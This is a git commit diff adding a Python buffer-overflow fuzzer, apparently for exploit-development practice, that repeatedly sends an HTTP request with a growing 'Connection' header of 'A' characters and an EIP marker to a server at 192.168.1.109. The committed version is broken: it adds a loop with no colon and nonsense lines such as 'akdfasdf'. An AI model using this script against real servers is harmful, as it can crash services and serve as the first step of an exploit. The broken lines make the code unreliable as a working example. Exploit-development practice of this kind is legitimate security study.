653fce13b4e71f518b6712f58530a6e502581bed
danilofernassis <danilofernassis@gmail.com>
2021-05-11 14:50:19 -0300

    First Commint

--- Buffer_Overflow/Simple_HTTP_Server/fuzzing.py
+++ Buffer_Overflow/Simple_HTTP_Server/fuzzing.py
@@ -1,28 +1,33 @@
 #!/usr/bin/env python3
 
-import socket, sys
+import socket
+import sys
 
 ip = "192.168.1.109"
 port = 80
 
-buf = ("A"*2048)
+buf = ("A" * 2048)
 
 eip = "BCDE"
 
+for n in range(1, 255)
+    akdfasdf
+    adfddf
+
 
 while True:
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((ip, port))
-		buff = ("GET / HTTP/1.1\r\n")
-		s.send(buff)
-		buff = ("Host: 192.168.1.109\r\n")
-		s.send(buff)
-		buff = ("Connection: " + buf + eip + "\r\n\n")
-		s.send(buff)
-		print("Fuzzing " + str(len(buff)))
-		s.recv(1024)
-		s.close()
-		buf += ("A"*100)
-	except:
-		sys.exit(0)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        buff = ("GET / HTTP/1.1\r\n")
+        s.send(buff)
+        buff = ("Host: 192.168.1.109\r\n")
+        s.send(buff)
+        buff = ("Connection: " + buf + eip + "\r\n\n")
+        s.send(buff)
+        print("Fuzzing " + str(len(buff)))
+        s.recv(1024)
+        s.close()
+        buf += ("A" * 100)
+    except:
+        sys.exit(0)
